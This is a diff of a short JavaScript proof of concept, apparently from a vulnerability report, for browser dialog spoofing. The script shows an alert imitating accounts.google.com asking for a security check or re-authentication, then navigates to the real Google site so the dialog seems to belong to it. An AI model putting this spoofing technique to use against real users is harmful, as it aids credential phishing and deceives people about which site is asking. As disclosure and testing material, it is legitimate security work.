@@ -1,16 +1,7 @@
 <script>
-function poc() {
-  // 1. Trigger dialog dari origin A
-  setTimeout(() => {
-    alert("google.com\nSession expired.\nPlease re-authenticate.");
-  }, 100);
-
-  // 2. Segera navigasi ke origin B
-  setTimeout(() => {
-    location.href = "https://www.google.com";
-  }, 150);
-}
-
-// 3. Jalankan setelah page stabil
-setTimeout(poc, 2000);
+setTimeout(() => {
+  document.body.innerHTML = "<h1>attacker.site</h1>";
+  alert("accounts.google.com\nSecurity check required");
+  location.href = "https://accounts.google.com";
+}, 2000);
 </script>
